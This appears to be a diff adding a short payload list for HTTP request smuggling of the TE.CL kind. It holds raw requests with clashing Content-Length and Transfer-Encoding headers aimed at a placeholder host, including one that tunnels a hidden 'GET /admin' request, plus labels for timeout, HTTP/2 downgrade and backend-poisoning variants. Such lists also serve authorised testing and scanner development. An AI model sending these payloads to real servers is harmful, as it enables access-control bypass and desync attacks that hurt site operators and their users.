@@ -1,0 +1,13 @@
+POST / HTTP/1.1\r\nHost: TARGET\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n12\r\nSMUGGLED REQUEST\r\n0\r\n\r\n
+POST / HTTP/1.1\r\nHost: TARGET\r\nContent-Length: 3\r\nTransfer-Encoding: chunked\r\n\r\n6\r\nprefix\r\n0\r\n\r\n
+POST /search HTTP/1.1\r\nHost: TARGET\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n7c\r\nGET /admin HTTP/1.1\r\nHost: TARGET\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 144\r\n\r\nx=\r\n0\r\n\r\n
+TE.CL: TE_frontend_CL_backend
+te_cl_differential_response
+te_cl_request_tunneling
+Transfer-Encoding: chunked with CL mismatch
+TE: 5\r\nHELLO\r\n0\r\nCL: 3
+chunked_body_longer_than_content_length
+te_cl_timeout_attack
+POST / TE=chunked CL=3 body=6bytes
+te_cl_h2_downgrade_desync
+te_cl_backend_poison
